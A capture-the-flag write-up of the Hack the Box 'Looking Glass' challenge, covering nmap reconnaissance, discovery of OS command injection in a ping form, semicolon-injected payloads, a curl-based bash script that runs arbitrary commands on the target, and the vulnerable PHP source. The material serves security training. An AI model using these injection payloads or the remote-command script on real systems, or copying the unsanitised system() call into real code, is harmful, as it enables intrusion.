# Looking Glass write-up by Herman Detwiler

## Overview

Looking glass is an easy box on Hack the Box, and can be found on the OWASP top 10 track. We are given the following description: 

*We've built the most secure networking tool in the market, come and check it out!*

The first step is going to be to gather as much information about the target as possible.

## Recon

Given that we are given a docker address to looking glass: 161.35.47.235:30278 first I will run an nmap scan of the target to attempt and enumerate service and underlying OS information about the target. To do this I use the following nmap command to enumerate serverice version, run basic nse scripts, and to attempt OS detection:

```bash
sudo nmap -sC -sV -O 161.35.47.235 -p 30278
```

However initially the host seems down because the host is blocking ping attempts. To counter this we can add the -Pn flag to our nmap command.

```bash
└─$ sudo nmap -sC -sV 161.35.47.235 -p 30278 -Pn -O
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-04 10:57 EDT
Nmap scan report for 161.35.47.235
Host is up (0.086s latency).

PORT      STATE SERVICE VERSION
30278/tcp open  http    nginx
|_http-title: rce
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%), HP P2000 G3 NAS device (92%), ASUS RT-N56U WAP (Linux 3.4) (91%), Linux 3.16 (91%), Linux 2.6.32 (91%), Linux 2.6.39 - 3.2 (91%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (91%), Linux 3.1 - 3.2 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 10 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.28 seconds
```
Based on these findings, I can be fairly certain that this is a linux box, running an nginx web server. My next step is to further enumerate this service using various commands to try and see if I can get an idea of the functionality of this web server.

## Enumeration

Using my web browser to manually view the webapp I can see that it is desiegned to perform two different network tests, traceroute and ping. It also displays my actual ip address, which has been redacted on the screenshots.

![image](https://user-images.githubusercontent.com/83407557/161574988-faf3c1c6-6625-47cf-ad47-70933d97f7e2.png)

After manually messing around with functionality I can determine that the webapp is not connected to the internet, as any attempt to ping myself or any other internet facing ip address is met with 100% packet loss:

Just as example trying to ping example.com:

1. Getting ipv4 address of example.com from kali

![image](https://user-images.githubusercontent.com/83407557/161576640-71832a69-3d2b-433a-8a6f-9b9861a832c4.png)

2. Pinging that ipv4 from kali (to show what a box that is connected looks like)

![image](https://user-images.githubusercontent.com/83407557/161576870-f0d9be61-1f61-47ca-9559-4f86f2d11160.png)

3. Doing the same from looking glass to verify 100% packet loss

![image](https://user-images.githubusercontent.com/83407557/161577155-cc56b1ba-a248-4590-b651-ded46cbdbd26.png)

## Building an exploit

Seeing as that the server seems to be running system commands, I need to see if I can break out of the intended ping or traceroute commands and run my own.

### POC

Again using kali to show what I am attempting to do, I need to write a one liner that will both ping and then also run another command. I will us the uname command in linux to try and identify the underlying OS. When run by itself it looks like this:


![image](https://user-images.githubusercontent.com/83407557/161585460-b734416a-3681-4622-9c93-08943276940b.png)

I can also tell that the server is not just running ping by itself, as it always returns four packets. So even though it just says "ping" the actual command is going to be closer to "ping -c4 -w3" so that is what I am going to use locally to get the output as close to the server's as I can. To make bash run another command after the first I can use a semicolon ";". With this in-mind the entire command to ping 8.8.8.8 four times and then run the uname command on kali:

```bash
ping -c4 -w3 8.8.8.8;uname
```
![image](https://user-images.githubusercontent.com/83407557/161586497-8b21c91b-7ee8-4b8a-99b1-678d2e982dcf.png)

As you can see after running the ping command, at the very end of the output it also says "Linux". Now I can see if I can get the same output on looking glass, by adding a semicolon and the uname command to the ip address just as above:

```
8.8.8.8;uname
```

![image](https://user-images.githubusercontent.com/83407557/161587002-cc215b51-2688-4759-91e6-178e85fb4a2e.png)

Even though the ping command returned 100% packet loss, it can be seen the that uname command returned as well. However before I build this into a working exploit, I want to make it a little faster. Each time looking glass trys to ping it takes serveral seconds, which will add up if I am trying to run commands. To counter this, I will try my next manual command against localhost(127.0.0.1) to see if it speeds up the ping command. I want to get all of the OS info using the uname -a command. Using the same method as before:

```
127.0.0.1;uname -a
```

![image](https://user-images.githubusercontent.com/83407557/161587809-785d43cd-71f2-429c-a370-4bd454fe6a1b.png)

and Bingo! was able to get it to work marginally faster and also now know the kernel info. With this I can build my actual exploit.

### Making a bash script

Taking a look at the post request that was sent to the server to perform the ping command, I can copy this as a curl request to begin building a bash script for myself. I will call this initial script tinker.sh.

```bash
#!/bin/bash

curl 'http://178.128.163.152:32305/' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://178.128.163.152:32305/' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://178.128.163.152:32305' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0' --data-raw 'test=ping&ip_address=127.0.0.1%3Buname&submit=Test'

```
Running tinker.sh I can see that I get the same output as I did with my POC:

![image](https://user-images.githubusercontent.com/83407557/161610497-96c04432-637a-447a-bf73-51f6edeb1593.png)

Now I need to modify tinker.sh to make my acutal exploit script, where I can give commands as arguments and get the output in the response. To do this I will change the line

```
--data-raw 'test=ping&ip_address=127.0.0.1%3Buname&submit=Test'
```

to 

```
--data-raw "test=ping&ip_address=127.0.0.1%3Bu$1&submit=Test"
```
to make it so instead of the uname command it will run the first argument I pass to my bash script.

```bash
#!/bin/bash

curl 'http://178.128.163.152:32305/' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://178.128.163.152:32305/' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://178.128.163.152:32305' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0' --data-raw "test=ping&ip_address=127.0.0.1%3B$1&submit=Test"
```

Now I can run any number of commands, right from my command line:

whoami command

![image](https://user-images.githubusercontent.com/83407557/161611409-c8643e1e-64e3-46d3-879e-6f4ec51c84fb.png)

hostname command:

![image](https://user-images.githubusercontent.com/83407557/161611487-9d5c76d1-8d84-4f36-b8c4-f343f36e64ab.png)
![image](https://user-images.githubusercontent.com/83407557/161611582-3fcec2f5-3a51-4a46-b98a-c0b34e7f06d3.png)

## Getting the flag.

Using the script developed in the last section the following additional information was discovered: we are in the www directory, and the only other file in the directory is index.php, which we are now able to flush out and view the source code.

```php
<?php
function getUserIp()
{
    return $_SERVER['REMOTE_ADDR'];
}

function runTest($test, $ip_address)
{
    if ($test === 'ping')
    {
        system("ping -c4 ${ip_address}");
    }
    if ($test === 'traceroute')
    {
        system("traceroute ${ip_address}");
    }
}

?>
```

Normally my next step would be to enumerate the software on the target to see if there is anything I could use to get a reverse shell. However, since I can now see the source code, I am pretty sure that a rev shell will not work as this box doesn't seem to be able to connect back to me. However since I already have a webshell script, I should have all I need to find the flag. First I want to get an idea of the filesystem.

![image](https://user-images.githubusercontent.com/83407557/161617360-4308ea8b-f8b6-4bb1-90ee-e73b9bcf03e7.png)

the following directory sticks out
![image](https://user-images.githubusercontent.com/83407557/161617095-3bc1a01f-fc51-4342-83f7-36603c1f678a.png)

Using cat to read the contents
![image](https://user-images.githubusercontent.com/83407557/161617475-dd88f9f5-75d5-4cbd-ac90-ea1918d14f2d.png)
and I get the flag
![image](https://user-images.githubusercontent.com/83407557/161617573-af5706d8-2172-48b5-b60e-2d5c0f9b5c27.png)

